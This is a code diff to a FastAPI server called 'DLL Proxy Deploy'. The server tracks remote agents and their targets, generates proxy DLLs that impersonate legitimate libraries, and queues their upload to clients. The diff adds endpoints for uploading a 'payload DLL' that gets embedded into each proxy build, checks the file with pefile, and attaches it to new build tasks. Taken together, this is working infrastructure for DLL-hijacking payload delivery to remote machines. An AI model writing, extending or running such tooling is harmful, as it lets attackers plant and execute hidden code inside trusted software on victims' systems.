@@ -12,6 +12,9 @@ Endpoints:
     GET  /api/clients/{id}     client detail + targets
     POST /api/select           select target -> creates upload task for client
     GET  /api/builds           list all builds
+    POST /api/payload          upload a payload DLL for embedding
+    GET  /api/payload          get current payload config
+    DELETE /api/payload        remove configured payload
 
   Web UI:
     GET  /                     dashboard
@@ -21,6 +24,7 @@ import asyncio
 import traceback
 from pathlib import Path
 
+import pefile
 from fastapi import FastAPI, UploadFile, File, Form, HTTPException, Request
 from fastapi.responses import FileResponse, HTMLResponse
 from fastapi.staticfiles import StaticFiles
@@ -32,6 +36,7 @@ app = FastAPI(title="DLL Proxy Deploy")
 store = Store()
 
 STATIC_DIR = Path(__file__).parent / "static"
+PAYLOAD_DIR = BUILDS_DIR / "_payloads"
 app.mount("/static", StaticFiles(directory=str(STATIC_DIR)), name="static")
 
 
@@ -113,12 +118,18 @@ async def upload_dll(
 def _run_build(build, dll_name: str, arch: str, agent_id: str, target_id: int):
     """Run proxy generation + compilation (blocking, runs in thread)."""
     try:
-        print(f"[BUILD] Starting build {build.id} for {dll_name} ({arch})", flush=True)
+        payload_dll = Path(build.payload_dll_path) if build.payload_dll_path else None
+        payload_exp = build.payload_export or None
+
+        print(f"[BUILD] Starting build {build.id} for {dll_name} ({arch})"
+              f"{' + payload-dll' if payload_dll else ''}", flush=True)
         proxy_path = build_proxy(
             build_id=build.id,
             original_dll_path=Path(build.original_dll_path),
             dll_name=dll_name,
             arch=arch,
+            payload_dll_path=payload_dll,
+            payload_export=payload_exp,
         )
         build.proxy_dll_path = str(proxy_path)
         build.status = BuildStatus.READY
@@ -206,6 +217,7 @@ async def select_target(request: Request):
     data = await request.json()
     agent_id = data.get("client_id", "") or data.get("agent_id", "")
     target_id = data.get("target_id", 0)
+    payload_export = data.get("payload_export", "") or store.payload_export
 
     agent = store.get_agent(agent_id)
     if not agent:
@@ -214,8 +226,71 @@ async def select_target(request: Request):
     if not target:
         raise HTTPException(404, "target not found")
 
-    build = store.create_build(agent_id, target_id)
-    return {"status": "ok", "build_id": build.id, "message": "upload task queued"}
+    build = store.create_build(
+        agent_id, target_id,
+        payload_dll_path=store.payload_dll_path,
+        payload_export=payload_export,
+    )
+    has_payload = bool(store.payload_dll_path)
+    msg = "upload task queued"
+    if has_payload:
+        msg += f" (payload: {Path(store.payload_dll_path).name})"
+    return {"status": "ok", "build_id": build.id, "message": msg}
+
+
+# ── Payload DLL Management ───────────────────────────────────
+
+@app.post("/api/payload")
+async def upload_payload(
+    file: UploadFile = File(...),
+    export_name: str = Form(""),
+):
+    """Upload a payload DLL to embed in future builds."""
+    PAYLOAD_DIR.mkdir(parents=True, exist_ok=True)
+    payload_path = PAYLOAD_DIR / file.filename
+    content = await file.read()
+    with open(payload_path, "wb") as f:
+        f.write(content)
+
+    try:
+        pe = pefile.PE(str(payload_path), fast_load=True)
+        is_dll = bool(pe.FILE_HEADER.Characteristics & 0x2000)
+        pe.close()
+        if not is_dll:
+            payload_path.unlink()
+            raise HTTPException(400, "File is an EXE, not a DLL")
+    except pefile.PEFormatError:
+        payload_path.unlink()
+        raise HTTPException(400, "Not a valid PE file")
+
+    store.payload_dll_path = str(payload_path)
+    store.payload_export = export_name
+    print(f"[PAYLOAD] Configured: {file.filename}"
+          f"{' export=' + export_name if export_name else ''}", flush=True)
+    return {"status": "ok", "filename": file.filename, "export": export_name}
+
+
+@app.get("/api/payload")
+async def get_payload():
+    if store.payload_dll_path and Path(store.payload_dll_path).exists():
+        return {
+            "configured": True,
+            "filename": Path(store.payload_dll_path).name,
+            "export": store.payload_export,
+        }
+    return {"configured": False, "filename": "", "export": ""}
+
+
+@app.delete("/api/payload")
+async def remove_payload():
+    if store.payload_dll_path:
+        p = Path(store.payload_dll_path)
+        if p.exists():
+            p.unlink()
+    store.payload_dll_path = ""
+    store.payload_export = ""
+    print("[PAYLOAD] Removed", flush=True)
+    return {"status": "ok"}
 
 
 # ── Web UI ────────────────────────────────────────────────────
